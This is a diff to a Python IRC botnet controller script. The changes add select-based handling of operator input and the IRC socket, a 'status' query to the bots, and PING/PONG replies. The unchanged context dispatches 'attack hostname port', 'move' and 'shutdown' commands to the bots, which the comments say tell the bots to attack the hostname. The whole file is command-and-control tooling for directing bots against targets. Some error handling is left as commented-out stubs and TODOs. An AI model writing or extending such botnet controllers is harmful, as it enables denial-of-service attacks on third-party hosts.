@@ -2,6 +2,7 @@ import time
 import socket
 import sys
 import random
+import select
 
 ERROR_FLAG = -1
 
@@ -23,8 +24,15 @@ def send_command():
 
 #ids bots and prints out numbers
 def status():
-	return
+	send("PRIVMSG " + channel +" "+"status"+"\n")
+	##gets replieds back from irc
+	msg = rcv_irc_response()
+	print(msg.strip())
 
+	cmd = msg[msg.find(':', 1)+1:]
+	#except somerror:
+		#con_active = False
+	
 #tells the bots to attack the hostname
 def attack(hostname, port):
 	#send a message containing  a counter and the nick of the bot
@@ -62,6 +70,16 @@ def send(msg):
 	#except someerror:
 		#con_active = False
 	return
+	
+#receive a command from the controller TO DO parsing needed and error checking
+def rcv_irc_response():
+	#try:
+	msg = irc.recv(1024).decode()
+	if msg.find('PING') != -1:
+		send('PONG ' + msg.split()[1] + '\r\n')
+		return "Ping pong conflict"
+	else:		
+		return msg
 
 #connect to the specified IRC server and channel
 def connect(host, port):
@@ -78,7 +96,7 @@ def connect(host, port):
 	send("USER " + nick + " " + nick + " " + nick + ": This controller is connecting\n") 
 	send("NICK " + nick + "\n")
 	send("JOIN " + channel + "\n")
-
+	print("command> ", end = "")
 	return 
 
 #handle the connection to the IRC server
@@ -86,26 +104,41 @@ def handle_connection():
 	#TO DO Verify controller
 	
 	while active:
-	
-		#wait for commands
-		cmd = get_command()
-	
-		#interpret command
-		if cmd[0] == 'status':
-			status()
-		elif cmd[0] == "attack":
-			attack(cmd[1],cmd[2])
-		elif cmd[0] == "move":
-			move(cmd[1], cmd[2], cmd[3]) 
-		elif cmd[0] == "quit":
-			quit() 
-		elif cmd[0] == "shutdown":
-			shutdown()
-		elif con_active == False:
-			break
-		else:
-			print("Error: Unrecognized command received '" + ' '.join(cmd) + "'")
-	
+		readable, writeable, exceptable = select.select([irc,sys.stdin],[],[])
+		for s in readable:
+			##check the type
+			#if s std do cmds
+			
+			if s == sys.stdin:
+				#wait for commands
+				
+				msg = sys.stdin.readline()
+				cmd = msg.split()
+						
+				#interpret command
+				if cmd[0] == 'status':	
+					status()
+				elif cmd[0] == "attack":
+					attack(cmd[1],cmd[2])
+				elif cmd[0] == "move":
+					move(cmd[1], cmd[2], cmd[3]) 
+				elif cmd[0] == "quit":
+					quit() 
+				elif cmd[0] == "shutdown":
+					shutdown()
+				elif con_active == False:
+					break
+				else:
+					print("Error: Unrecognized command received '" + ' '.join(cmd) + "'")
+				
+			elif s == irc:			
+				msg = irc.recv(1024).decode()
+				send('PONG ' + msg.split()[1] + '\r\n')
+				
+			#else ping pong	
+
+		
+
 	return
 
 #main
